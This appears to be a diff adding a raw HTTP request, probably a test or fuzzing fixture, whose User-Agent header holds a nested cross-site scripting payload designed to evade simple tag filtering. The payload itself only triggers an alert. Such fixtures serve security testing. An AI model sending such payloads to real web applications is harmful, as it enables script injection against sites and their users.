@@ -1,0 +1,7 @@
+GET / HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: \"<scr<script>ipt>alert(0x000123)<scr</script><ipt
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
